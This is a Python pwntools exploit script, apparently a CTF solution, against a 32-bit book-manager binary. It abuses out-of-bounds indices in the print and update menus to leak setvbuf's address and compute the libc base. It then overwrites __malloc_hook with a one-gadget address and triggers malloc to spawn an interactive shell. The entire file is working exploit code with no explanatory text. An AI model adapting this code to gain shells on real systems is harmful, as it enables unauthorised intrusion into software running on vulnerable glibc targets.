from pwn import *
import struct
context.log_level='debug'
gadget =[0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
books = 0x84978E4
debug = 1
if debug:	
	p = process('./pwn1_nobof.no-bof')
	libc = ELF('/lib/i386-linux-gnu/libc.so.6')
else:
	p = remote('',)
	libc= ELF('./libc-2.19.so')
def insert(title,price):
	p.sendlineafter("Your input: ",'1')
	p.sendlineafter("Book title: ",title)
	p.sendlineafter("Book price: ",price)
def update(idx,title,price):
	p.sendlineafter("Your input: ",'2')
	p.sendlineafter("which book do you want to update?\n",str(idx))
	p.sendafter("Book title: ",title)
	p.sendlineafter("Book price: ",price)
def prin(idx):
	p.sendlineafter("Your input: ",'5')
	p.sendlineafter("which book do you want to print?\n",str(idx))

vbuf_idx =  (0-(0x84978E4-0x8069FE4)/256)
prin(vbuf_idx)
p.recvuntil("Book ")
data = p.recvuntil(" ")[:-1]
setvbuf_addr = int(data)&0xffffffff
log.info("setvbuf_addr:%#x",setvbuf_addr)
libc_base = setvbuf_addr- libc.symbols['setvbuf']
malloc_hook = libc_base + libc.symbols['__malloc_hook']
log.info("malloc_hook:%#x",malloc_hook)

#gdb.attach(p,"b *0x0805BA1B")
hook_idx = struct.unpack("i",p32(0xf0000000 +(malloc_hook-0x84978E4)/256))[0]
print hook_idx

if debug:
	update(hook_idx,0x7c*'a'+p32(libc_base+gadget[2])+'\n','2')
else:
	update(hook_idx,0x54*'a'+p32(libc_base+gadget[2])+'\n','2')
p.sendlineafter("Your input: ",'4 %422222c')

p.interactive()

